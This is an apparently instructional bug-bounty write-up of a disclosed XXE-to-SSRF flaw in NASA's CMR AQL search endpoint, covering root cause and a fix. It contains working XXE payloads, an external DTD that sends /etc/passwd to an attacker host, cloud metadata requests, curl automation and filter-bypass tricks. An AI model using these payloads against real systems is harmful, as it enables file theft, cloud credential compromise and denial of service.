# XXE + SSRF - Critical XXE via Regex Bypass in NASA CMR AQL (Original: Bugcrowd NASA VDP - P1 Critical 9.1)

> Original: https://bugcrowd.com/disclosures/9d2c7b28-7ff7-439c-9149-f74a883815e3/ | Reporter: dewankpant | Disclosed: 2026-03-17 | Severity: Critical 9.1 P1 | Asset: POST /search/concepts/search (CMR AQL) | Fix: https://github.com/nasa/Common-Metadata-Repository/pull/2378

## 1. TL;DR for Hunters
Public `POST /search/concepts/search` takes XML AQL. Filter tried to strip `<!DOCTYPE...>` with regex `#"<!DOCTYPE.*?>"`. In Java regex, `.` = any char EXCEPT newline. So multi-line DOCTYPE bypasses filter and reaches `clojure.data.xml/parse-str` with external entities ON. Attacker gets SSRF callbacks from NASA prod, exfils AWS ID, ECS ARN, EC2 hostnames, kernel via external DTD, plus file-enum via status diff and 75s DoS per entity. Same root you know: regex looks safe, one char-class hole = full bypass.

## 2. Attack Surface & Context
- Stack: Clojure `common-lib/src/cmr/common/xml.clj`, `clojure.data.xml/parse-str`.
- Endpoint: `POST /search/concepts/search` with `Content-Type: application/xml` AQL body.
- Hunt same: any XML upload/import/search, SAML, SVG, XLSX/docx (zip+xml), SOAP, AQL/GraphQL with XML, `DOCTYPE` filter using regex not parser hardening.

## 3. Concepts Explained Simply (word-by-word)

Payload 1 - the filter:
```clojure
#"<!DOCTYPE.*?>"
```
- `#""` = Clojure regex literal. Same as `/.../` in JS.
- `<!DOCTYPE` = literal start of doctype.
- `.*?` = any chars, few as possible (`?` = lazy). BUT `.` = any EXCEPT `\n` newline in Java default. So single-line `<!DOCTYPE foo>` matches, multi-line does NOT.
- `>` = literal end.
- Whole: "strip single-line DOCTYPE only". Multi-line slips through.

Payload 2 - bypass (instructor-added example, standard XXE):
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "https://attacker.burpcollaborator.net/evil.dtd">
%ext;
]>
<aql><query>test</query></aql>
```
- `<?xml...?>` = header.
- `<!DOCTYPE root [` = start, with newline after → regex `.*?>` fails to match across newline → NOT stripped.
- `<!ENTITY % ext SYSTEM "https://.../evil.dtd">` = param entity: "fetch external file".
- `%ext;` = use it → forces server to make outbound HTTP (SSRF proof).
- `attacker evil.dtd` contains:
```
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'https://attacker/?x=%data;'>">
```
→ OOB exfil of file / AWS metadata.

Payload 3 - SSRF proof without file read:
```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "https://attacker.burpcollaborator.net/ping">]>
<aql>&xxe;</aql>
```
If collaborator gets hit from NASA IP, SSRF confirmed, no damage.

## 4. Step-by-Step Reproduction (with examples)
Step 1 baseline: `POST /search/concepts/search` with normal `<aql><q>test</q></aql>` → 200.
Step 2 single-line blocked: send `<!DOCTYPE foo>` single line → stripped/blocked (filter works).
Step 3 multi-line bypass + callback:
```http
POST /search/concepts/search HTTP/2
Host: cmr.nasa.gov
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "https://YOUR.burpcollaborator.net/test">
]>
<search><query>&xxe;</query></search>
```
→ check collaborator: HTTP hit from NASA prod = SSRF.
Step 4 OOB file/meta: use external DTD above to read `file:///etc/passwd`, `http://169.254.169.254/latest/meta-data/iam/info` (AWS ID), ECS `http://169.254.170.2/v2/metadata`. Report shows AWS Account ID, ECS ARN, EC2 hostname, kernel, container meta exfilled.
Step 5 blind enum: `file:///etc/hosts` exists → 200 vs `file:///nope` → 400/500 diff = oracle. Internal `http://169.254.169.254` timing diff = service enum. Many entities → 75s × N = DoS (don't DoS prod, 1 entity enough).

## 5. Root Cause Analysis
```clojure
;; vulnerable
(def doctype-re #"<!DOCTYPE.*?>")
(defn sanitize [xml] (clojure.string/replace xml doctype-re ""))
;; parse-str with external entities enabled (default)
(clojure.data.xml/parse-str xml) ;; resolves SYSTEM entities
```
- Regex doesn't match `\n`, parser does. Filter/parser disagreement.
- Parser hardening missing: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` or `external-general-entities false`.
Fixed PR #2378: proper XML hardening + DOTALL or parser-level block, not regex. Verify: multi-line DOCTYPE → 400, no collaborator hit.

## 6. Why It Slipped Past Devs
- Thought regex strips all DOCTYPE. Didn't know `.` ≠ newline in Java.
- Trusted sanitizer, left parser defaults ON.
- Single-line tests passed, no multi-line test.
- AQL seen as query language, not XML attack surface.

## 7. Advanced Completions - How to Take It Further
1. Newline variants: `\n`, `\r\n`, `\r`, tab, `<!-- comment -->` inside DOCTYPE to break naive regex.
2. UTF-7, BOM, encoding tricks if filter is byte-based.
3. SVG/XLSX/SAML same bypass: upload avatar.svg with multi-line DOCTYPE → stored XXE.
4. Cloud metadata chain: `169.254.169.254` → IAM creds → AWS takeover (like SSRF lessons).
5. Error-based: `<!ENTITY xxe SYSTEM "file:///nonexistent">` → error message leaks path?
6. Billion laughs DoS: `<!ENTITY a "xxxxxxxxxx">` ×10 nested → 75s demonstrated, don't exploit beyond 1.
7. WAF bypass: `<!DOC/**/TYPE`, case `<!doctype`, extra spaces `<!DOCTYPE  root`.
8. Code search: grep `parse-str`, `DocumentBuilder`, `XMLReader`, `<!DOCTYPE.*?>` in GitHub, plus `common-lib/.../xml.clj` clones.

## 8. Hunting Methodology Checklist
- [ ] Find XML entry: intercept, change Content-Type to `application/xml`, try `<?xml?><a/>`.
- [ ] Send single-line `<!DOCTYPE t>` → blocked? Then multi-line with `\n` → bypass?
- [ ] Collaborator for OOB, never prod file dump beyond proof.
- [ ] Check parser error diff for file oracle.
- [ ] Look for `.js.map`, GitHub `xml.clj`, `DocumentBuilderFactory` without hardening.

## 9. Automation
```bash
# single vs multi
curl -s -X POST https://target/search/concepts/search -H 'Content-Type: application/xml' -d '<!DOCTYPE t><a>hi</a>' -i
curl -s -X POST https://target/search/concepts/search -H 'Content-Type: application/xml' -d $'<?xml version="1.0"?>\n<!DOCTYPE r [\n<!ENTITY x SYSTEM "https://YOUR.oastify.com/x">\n]>\n<a>&x;</a>' -i
# match: collaborator hit
```

## 10. Mitigation & Fix Review
Disable DOCTYPE or external entities at parser, not regex. If regex needed, use `(?s)` DOTALL. Least-priv metadata (IMDSv2), egress allowlist. Verify: multi-line → blocked, no outbound.

## 11. Practice Lab
- PortSwigger XXE labs (exploiting XXE to perform SSRF, blind OOB).
- Local Clojure/Java: `DocumentBuilderFactory` with/without `disallow-doctype-decl`, test newline bypass.
- regex101 Java flavor: `<!DOCTYPE.*?>` vs multi-line string.

## 12. Key Takeaway for Daily Hunting
Today grep for `DOCTYPE.*?>`, `parse-str`, `DocumentBuilder`. Any regex filter for XML = try newline bypass + collaborator. Same “dot doesn’t match all” lesson as Khan.
